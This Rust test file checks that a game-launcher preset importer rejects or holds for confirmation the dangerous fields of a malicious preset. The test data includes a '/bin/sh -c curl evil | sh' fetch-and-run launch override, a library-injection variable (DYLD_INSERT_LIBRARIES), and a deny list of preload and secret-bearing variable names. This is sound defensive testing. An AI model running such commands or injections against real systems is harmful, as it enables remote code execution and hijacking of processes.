use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use applejack_config::presets::{self, Confirmation, Rejected};
use applejack_config::{
    ConfigDb, EnvPolicy, Error, GameConfig, GraphicsBackend, ImportOptions, Preset,
};

const MALICIOUS_PRESET: &str = include_str!("fixtures/malicious-preset.json");

const ALLOWED: [&str; 15] = [
    "PATH",
    "HOME",
    "TMPDIR",
    "WINEPREFIX",
    "WINEDEBUG",
    "WINEDLLOVERRIDES",
    "WINEMSYNC",
    "WINEESYNC",
    "DXMT_CONFIG",
    "DXMT_LOG_LEVEL",
    "MTL_HUD_ENABLED",
    "ROSETTA_ADVERTISE_AVX",
    "GST_PLUGIN_PATH",
    "APPLEJACK_SESSION",
    "VK_ICD_FILENAMES",
];

const PATH_VALUED: [&str; 4] = [
    "VK_ICD_FILENAMES",
    "GST_PLUGIN_PATH",
    "DXMT_CONFIG",
    "WINEPREFIX",
];

struct FixturePolicy {
    roots: Vec<PathBuf>,
    overlay: bool,
}

impl FixturePolicy {
    fn new(data_dir: &Path, overlay: bool) -> Self {
        Self {
            roots: vec![data_dir.join("engines"), data_dir.join("prefixes")],
            overlay,
        }
    }
}

impl EnvPolicy for FixturePolicy {
    fn allows(&self, name: &str) -> bool {
        ALLOWED.contains(&name)
    }

    fn path_valued(&self, name: &str) -> bool {
        PATH_VALUED.contains(&name)
    }

    fn allowed_roots(&self) -> &[PathBuf] {
        &self.roots
    }

    fn d3dmetal_overlay_present(&self) -> bool {
        self.overlay
    }
}

fn data_dir() -> PathBuf {
    PathBuf::from("/Users/example/Library/Application Support/applejack")
}

fn rejected<'a>(items: &'a [Rejected], field: &str) -> &'a Rejected {
    items
        .iter()
        .find(|item| item.field == field)
        .unwrap_or_else(|| panic!("{field} not rejected: {items:?}"))
}

#[test]
fn malicious_preset_is_rejected_or_held_for_confirmation() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), false);
    let plan = presets::import(&preset, &policy, &data_dir(), ImportOptions::default()).unwrap();

    let icd = rejected(&plan.rejected, "extra_env.VK_ICD_FILENAMES");
    assert_eq!(icd.value, "/tmp/evil.json");
    assert!(icd.reason.contains("outside"), "{icd:?}");
    let dyld = rejected(&plan.rejected, "extra_env.DYLD_INSERT_LIBRARIES");
    assert!(dyld.reason.contains("DYLD_*"), "{dyld:?}");
    let d3dmetal = rejected(&plan.rejected, "graphics_backend");
    assert_eq!(d3dmetal.value, "d3dmetal");
    assert!(d3dmetal.reason.contains("overlay"), "{d3dmetal:?}");
    assert_eq!(plan.rejected.len(), 3, "{:?}", plan.rejected);

    assert_eq!(
        plan.confirmations,
        [
            Confirmation {
                field: "launch_exe_override".to_owned(),
                value: "/bin/sh".to_owned(),
            },
            Confirmation {
                field: "launch_args_override".to_owned(),
                value: "-c 'curl evil | sh'".to_owned(),
            },
        ]
    );
    assert!(plan.needs_confirmation());

    // WINEDLLOVERRIDES is an allowed name, so the env policy passes it; the
    // engine refuses ntdll overrides at launch (U6b), and the plan warns.
    assert_eq!(plan.warnings.len(), 1, "{:?}", plan.warnings);
    assert_eq!(plan.warnings[0].field, "extra_env.WINEDLLOVERRIDES");
    assert!(plan.warnings[0].reason.contains("ntdll"));
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG", "WINEDLLOVERRIDES"]
    );
    assert_eq!(plan.config.graphics_backend, None);
    assert_eq!(plan.config.hidraw_enabled, Some(true));
    assert!(plan.accepted.iter().any(|item| item.field == "engine_id"));

    let db = ConfigDb::open_in_memory().unwrap();
    let error = plan.apply(&db).unwrap_err();
    assert!(
        matches!(error, Error::ConfirmationRequired(ref items) if items.len() == 2),
        "{error}"
    );
    assert_eq!(
        db.game_config(10).unwrap(),
        None,
        "nothing written without confirmation"
    );
}

#[test]
fn confirmed_import_writes_filtered_config_only() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), false);
    let options = ImportOptions {
        accept_launch_overrides: true,
    };
    let plan = presets::import(&preset, &policy, &data_dir(), options).unwrap();
    assert!(!plan.needs_confirmation());

    let db = ConfigDb::open_in_memory().unwrap();
    db.set_field(10, "notes", "kept").unwrap();
    db.set_field(10, "extra_env", "DXMT_LOG_LEVEL=info")
        .unwrap();
    plan.apply(&db).unwrap();
    let stored = db.game_config(10).unwrap().unwrap();
    assert_eq!(stored.notes.as_deref(), Some("kept"));
    assert_eq!(stored.graphics_backend, None);
    assert_eq!(stored.launch_exe_override.as_deref(), Some("/bin/sh"));
    assert_eq!(
        stored.extra_env.keys().collect::<Vec<_>>(),
        ["DXMT_LOG_LEVEL", "WINEDEBUG", "WINEDLLOVERRIDES"]
    );
    assert!(!stored.extra_env.contains_key("VK_ICD_FILENAMES"));
    assert!(!stored.extra_env.contains_key("DYLD_INSERT_LIBRARIES"));
}

#[test]
fn d3dmetal_imports_when_the_overlay_is_present() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), true);
    let plan = presets::import(&preset, &policy, &data_dir(), ImportOptions::default()).unwrap();
    assert_eq!(
        plan.config.graphics_backend,
        Some(GraphicsBackend::D3dmetal)
    );
    assert!(
        !plan
            .rejected
            .iter()
            .any(|item| item.field == "graphics_backend")
    );
}

#[test]
fn data_dir_placeholder_expands_before_the_root_check() {
    let data = data_dir();
    let config = GameConfig {
        extra_env: BTreeMap::from([
            (
                "VK_ICD_FILENAMES".to_owned(),
                "$APPLEJACK_DATA_DIR/engines/rosetta-wine/1.0/icd.json".to_owned(),
            ),
            (
                "GST_PLUGIN_PATH".to_owned(),
                "$APPLEJACK_DATA_DIR/../escape".to_owned(),
            ),
            ("WINEPREFIX".to_owned(), "prefixes/relative".to_owned()),
            ("UNKNOWN_VAR".to_owned(), "1".to_owned()),
            ("API_TOKEN".to_owned(), "1".to_owned()),
        ]),
        direct_verified_at: Some("2026-10-28T00:00:00Z".to_owned()),
        ..GameConfig::default()
    };
    let preset = Preset {
        schema: 1,
        appid: 3,
        engine_id: None,
        engine_version: None,
        host_chip: None,
        macos_version: None,
        config,
    };
    let policy = FixturePolicy::new(&data, false);
    let plan = presets::import(&preset, &policy, &data, ImportOptions::default()).unwrap();
    assert_eq!(
        plan.config.extra_env["VK_ICD_FILENAMES"],
        format!("{}/engines/rosetta-wine/1.0/icd.json", data.display())
    );
    assert!(
        rejected(&plan.rejected, "extra_env.GST_PLUGIN_PATH")
            .reason
            .contains("..")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.WINEPREFIX")
            .reason
            .contains("absolute")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.UNKNOWN_VAR")
            .reason
            .contains("allowlist")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.API_TOKEN")
            .reason
            .contains("secret")
    );
    assert!(
        rejected(&plan.rejected, "direct_verified_at")
            .reason
            .contains("host-local")
    );
    assert_eq!(plan.confirmations, Vec::new());
    assert!(!plan.needs_confirmation());
    let db = ConfigDb::open_in_memory().unwrap();
    plan.apply(&db).unwrap();
    let stored = db.game_config(3).unwrap().unwrap();
    assert_eq!(stored.extra_env.len(), 1);
    assert_eq!(stored.direct_verified_at, None);
}

/// Allows every name and path, so only the policy-independent hard stops
/// in `import` can reject.
struct PermissivePolicy;

impl EnvPolicy for PermissivePolicy {
    fn allows(&self, _: &str) -> bool {
        true
    }

    fn path_valued(&self, _: &str) -> bool {
        false
    }

    fn allowed_roots(&self) -> &[PathBuf] {
        &[]
    }

    fn d3dmetal_overlay_present(&self) -> bool {
        true
    }
}

#[test]
fn hard_stops_hold_under_a_permissive_policy() {
    let names = [
        "dyld_insert_libraries",
        "DYLD_LIBRARY_PATH",
        "LD_PRELOAD",
        "ld_library_path",
        "PATH",
        "path",
        "HOME",
        "WINELOADER",
        "BASH_ENV",
        "MY_TOKEN",
    ];
    let config = GameConfig {
        engine_id: Some("../../tmp/x".to_owned()),
        engine_version: Some(".hidden".to_owned()),
        extra_env: names
            .iter()
            .map(|name| ((*name).to_owned(), "/x".to_owned()))
            .chain([("WINEDEBUG".to_owned(), "-all".to_owned())])
            .collect(),
        ..GameConfig::default()
    };
    let preset = Preset {
        schema: 1,
        appid: 4,
        engine_id: None,
        engine_version: None,
        host_chip: None,
        macos_version: None,
        config,
    };
    let plan = presets::import(
        &preset,
        &PermissivePolicy,
        &data_dir(),
        ImportOptions::default(),
    )
    .unwrap();
    assert!(
        rejected(&plan.rejected, "engine_id")
            .reason
            .contains("letters")
    );
    assert!(
        rejected(&plan.rejected, "engine_version")
            .reason
            .contains("letters")
    );
    for name in names {
        rejected(&plan.rejected, &format!("extra_env.{name}"));
    }
    assert_eq!(plan.rejected.len(), names.len() + 2, "{:?}", plan.rejected);
    assert_eq!(plan.config.engine_id, None);
    assert_eq!(plan.config.engine_version, None);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG"]
    );
}

#[test]
fn export_then_import_round_trips_a_clean_config() {
    let data = data_dir();
    let db = ConfigDb::open_in_memory().unwrap();
    db.set_field(10, "hidraw_enabled", "true").unwrap();
    db.set_field(10, "graphics_backend", "dxmt").unwrap();
    db.set_field(10, "extra_env", "WINEDEBUG=-all").unwrap();
    db.set_field(
        10,
        "extra_env",
        &format!(
            "DXMT_CONFIG={}/engines/rosetta-wine/1.0.user/dxmt.conf",
            data.display()
        ),
    )
    .unwrap();
    let preset = presets::export(&db, 10, &data).unwrap();
    let json = preset.to_json_pretty().unwrap();
    assert!(json.contains("$APPLEJACK_DATA_DIR/engines"), "{json}");
    let parsed = Preset::from_json(&json).unwrap();
    let policy = FixturePolicy::new(&data, false);
    let plan = presets::import(&parsed, &policy, &data, ImportOptions::default()).unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(plan.confirmations, Vec::new());
    let target = ConfigDb::open_in_memory().unwrap();
    plan.apply(&target).unwrap();
    assert_eq!(target.game_config(10).unwrap(), db.game_config(10).unwrap());
}
